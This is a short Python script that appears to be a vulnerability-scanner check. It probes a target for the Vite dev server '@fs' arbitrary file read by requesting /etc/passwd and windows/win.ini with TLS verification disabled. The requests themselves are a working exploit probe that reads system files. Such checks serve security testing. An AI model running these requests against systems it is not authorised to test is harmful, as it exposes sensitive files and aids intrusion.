import requests,re,urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
def scan(baseurl):
	try:
		if baseurl[-1]=="/":
			baseurl=baseurl
		else:
			baseurl=baseurl+"/"
		url=baseurl+"@fs/etc/passwd"
		headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0"}
		response=requests.get(url,headers=headers,timeout=5,verify=False)
		if response.status_code == 200 and re.search("root:[^:]*:[0-9]*:[0-9]*:[^:]*",response.text):
			r0=True
		else:
			r0=False
	except:
		r0=False
	try:
		if baseurl[-1]=="/":
			baseurl=baseurl
		else:
			baseurl=baseurl+"/"
		url=baseurl+"@fs/windows/win.ini"
		headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0"}
		response=requests.get(url,headers=headers,timeout=5,verify=False)
		if "16-bit app support" in response.text:
			r1=True
		else:
			r1=False
	except:
		r1=False
	if r0 or r1:
		return True
	else:
		return False
